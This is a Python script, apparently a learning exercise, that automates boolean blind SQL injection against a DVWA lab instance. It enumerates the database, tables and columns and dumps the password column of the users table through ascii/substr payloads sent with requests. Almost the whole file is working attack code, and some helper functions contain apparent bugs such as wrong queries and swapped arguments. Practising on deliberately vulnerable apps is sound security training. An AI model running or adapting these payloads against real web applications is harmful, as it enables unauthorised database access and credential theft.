# author:xiaoyue
# blog:cnmf.net.cn

# 判断数据库长度
# 猜解数据库
# 判断表段个数
# 判断表段长度
# 猜解表段
# 猜解字段个数
# 猜解字段长度
# 猜解字段


import requests

url='http://192.168.160.129/dvwa/vulnerabilities/sqli_blind/?id={}&Submit=Submit'
headers={
    'Cookie': 'security=low; PHPSESSID=i4h4v49rtnlteoomkhu073e34u'
}
key=[i for i in range(48,123)]


# def check_length_db():          #判断数据库长度
#     for i in range(1,100):
#         payload="1' and length(database())={} %23".format(i)
#         t=requests.get(url.format(payload),headers=headers)
#         if 'User ID exists in the database' in t.text:
#             return i

# def check_text_db(length):          #猜解数据库名称
#     db_text=''
#     for num in range(1,length+1):
#         for i in key:
#             payload="1' and ascii(substr(database(),{},{}))={}%23".format(num,1,i)
#             t=requests.get(url.format(payload),headers=headers)
#             if 'User ID exists in the database' in t.text:
#                 db_text+=chr(i)
#                 break
#         print('pu:'+db_text)



# 数据库
def new_check_text_db():
    db_text=''
    num=1
    _=''
    while 1:
        for i in key:
            _=db_text
            payload="1' and ascii(substr(database(),{},{}))={} %23".format(num,1,i)
            t=requests.get(url.format(payload),headers=headers)
            if 'User ID exists in the database' in t.text:
                db_text+=chr(i)
                num+=1
                break
        if db_text==_:
            return db_text
        print('out:'+db_text)











def check_num_tables():         #猜解表个数
    for i in range(1,100):
        payload="1' and (select count(table_name) from information_schema.tables where table_schema=database())={} %23".format(i)
        t=requests.get(url.format(payload),headers=headers)
        if 'User ID exists in the database' in t.text:
            return i

def check_length_tables(digit):         #猜解表长度
    for i in range(1,100):
        payload="1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit {},{}),1))={} %23".format(digit-1,digit,i)
        t=requests.get(url.format(payload),headers=headers)
        if 'User ID exists in the database' in t.text:
            return i

def check_text_tables(digit,length):            #猜解表名称
    tables_text=''
    for num in range(1,length+1):
        for i in key:
            payload="1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {},{}),{},{}))={} %23".format(digit-1,digit,num,1,i)
            t=requests.get(url.format(payload),headers=headers)
            if 'User ID exists in the database' in t.text:
                tables_text+=chr(i)
                break
        print('pu:'+tables_text)



def new_check_text_tables():
    tables=[]
    for num_biao in range(1,9999999):
        tables.append('')
        last=''
        for ranking_biao in range(1,99999999):
            for i in key:
                last=tables[num_biao-1]
                payload="1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {},{}),{},{}))={} %23".format(num_biao-1,num_biao,ranking_biao,1,i)
                t=requests.get(url.format(payload),headers=headers)
                if 'User ID exists in the database' in t.text:
                    tables[num_biao-1]+=chr(i)
                    break
            if last==tables[num_biao-1]:
                break
        if tables[num_biao-1]=='':
            tables.pop()
            return tables
        print('out:'+tables[num_biao-1])

















def check_num_column(table_name):           #猜解字段数
    for i in range(1,100):
        payload="1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='{}')={} %23".format(table_name,i)
        t=requests.get(url.format(payload),headers=headers)
        if 'User ID exists in the database' in t.text:
            return i


def check_text_column(digit):            #猜解字段名字
    columns_text=''
    _=''
    for _digit in range(1,digit):
        for num in range(1,999):
            _=columns_text
            for i in key:
                payload="1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {},{}),{},{}))={} %23".format(_digit-1,_digit,num,1,i)
                t=requests.get(url.format(payload),headers=headers)
                if 'User ID exists in the database' in t.text:
                    columns_text+=chr(i)
                    break
            print('pu:'+columns_text)
            if _==columns_text:
                print(dump('user',_))
                columns_text=''
                break


def dump(table_name,column_name):       #爆破字段
    _dump=''
    _=''
    for i in range(1,9999):
        _=_dump
        for j in key:
            payload="1' and ascii(substr((select {} from {} limit 1,1),{},1))={} %23".format(table_name,column_name,i,j)
            t=requests.get(url.format(payload),headers=headers)
            # print(t.url)
            if 'User ID exists in the database' in t.text:
                _dump+=chr(j)
                break
        if _==_dump:
            return _dump


# 1' and ascii(substr((select column_name from information_schema.columns where table_schema={} limit {},{}),{},{}))={} %23
# 1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),2,1))>1#


def new_check_text_columns(table):
    columns=[]
    for columns_num in range(1,999999):
        columns.append('')
        last=''
        for columns_ranking in range(1,999999):
            for i in key:
                last=columns[columns_num-1]
                payload="1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='{}' limit {},{}),{},{}))={} %23".format(table,columns_num-1,1,columns_ranking,1,i)
                # print(payload)
                t=requests.get(url.format(payload),headers=headers)
                # print(t.url)
                if 'User ID exists in the database' in t.text:
                    columns[columns_num-1]+=chr(i)
                    break
                # print(columns[columns_num-1])
            if last==columns[columns_num-1]:
                break
        if columns[columns_num-1]=='':
            columns.pop()
            return columns
        print(columns[columns_num-1])









# 1' and ascii(substr((select user from users limit {},{}),{},1))={} %23

def new_dump(column,table):
    data=[]
    for i in range(1,999999):
        data.append('')
        temp=''
        for j in range(1,999999):
            for k in key:
                temp=data[i-1]
                payload="1' and ascii(substr((select {} from {} limit {},{}),{},1))={} %23".format(column,table,i-1,1,j,k)
                t=requests.get(url.format(payload),headers=headers)
                if 'User ID exists in the database' in t.text:
                    data[i-1]+=chr(k)
                    break
            if temp==data[i-1]:
                break
        if data[i-1]=='':
            data.pop()
            return data
        print(data[i-1])



print(new_check_text_tables())
print(new_check_text_columns('users'))
print(new_dump('password','users'))